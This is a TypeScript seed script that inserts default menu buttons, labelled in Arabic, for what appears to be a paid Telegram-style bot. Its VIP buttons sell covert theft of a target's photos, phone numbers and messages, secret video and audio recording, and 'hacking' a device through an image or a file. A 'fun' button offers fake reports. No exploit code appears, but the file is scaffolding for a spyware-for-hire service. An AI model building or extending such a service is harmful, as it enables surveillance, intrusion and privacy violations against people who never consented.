import { getDb } from '../db';
import { botButtons } from '../../drizzle/schema';

/**
 * إضافة الأزرار الافتراضية
 */
export async function seedDefaultButtons() {
  const db = await getDb();
  if (!db) return;

  try {
    const existingButtons = await db.select().from(botButtons);
    if (existingButtons.length > 0) {
      console.log('✅ Buttons already exist');
      return;
    }

    const defaultButtons = [
      // أزرار المستخدم
      { text: '👥 المشتركين', callback: 'show_users', type: 'user', points: 0, order: 1 },
      { text: '💎 النقاط', callback: 'show_points', type: 'user', points: 0, order: 2 },
      { text: '🔗 رابط الإحالة', callback: 'referral_link', type: 'user', points: 0, order: 3 },
      
      // أزرار VIP
      { text: '📸 سحب الصور', callback: 'vip_photos', type: 'vip', points: 15, order: 10 },
      { text: '📞 سحب الأرقام', callback: 'vip_numbers', type: 'vip', points: 15, order: 11 },
      { text: '💬 سحب الرسائل', callback: 'vip_messages', type: 'vip', points: 15, order: 12 },
      { text: '🎬 تصوير فيديو', callback: 'vip_video', type: 'vip', points: 15, order: 13 },
      { text: '🎤 تسجيل صوت', callback: 'vip_audio', type: 'vip', points: 15, order: 14 },
      { text: '🖼️ اختراق عبر صورة', callback: 'vip_image_hack', type: 'vip', points: 20, order: 15 },
      { text: '📄 اختراق عبر ملف', callback: 'vip_file_hack', type: 'vip', points: 20, order: 16 },
      
      // أزرار ترفيهية
      { text: '😂 نكت', callback: 'jokes', type: 'fun', points: 0, order: 20 },
      { text: '📊 بلاغات وهمية', callback: 'fake_report', type: 'fun', points: 0, order: 21 },
      { text: '📸 سكرين شوت', callback: 'screenshot', type: 'fun', points: 0, order: 22 },
      
      // أزرار الدفع
      { text: '💳 شراء نقاط', callback: 'buy_points', type: 'payment', points: 0, order: 30 },
      { text: '💰 شراء VIP', callback: 'buy_vip', type: 'payment', points: 0, order: 31 },
      
      // أزرار الإدارة
      { text: '👥 المستخدمين', callback: 'admin_users', type: 'admin', points: 0, order: 40 },
      { text: '📢 إذاعة رسالة', callback: 'admin_broadcast', type: 'admin', points: 0, order: 41 },
      { text: '📡 القنوات', callback: 'admin_channels', type: 'admin', points: 0, order: 42 },
      { text: '🔧 الأزرار', callback: 'admin_buttons', type: 'admin', points: 0, order: 43 },
      { text: '💰 الدفعات', callback: 'admin_payments', type: 'admin', points: 0, order: 44 },
    ];

    for (const btn of defaultButtons) {
      await db.insert(botButtons).values({
        buttonText: btn.text,
        buttonCallback: btn.callback,
        buttonType: btn.type as any,
        requiredPoints: btn.points,
        isActive: true,
        order: btn.order,
      });
    }

    console.log(`✅ Added ${defaultButtons.length} default buttons`);
  } catch (error) {
    console.error('Error seeding buttons:', error);
  }
}

export default { seedDefaultButtons };
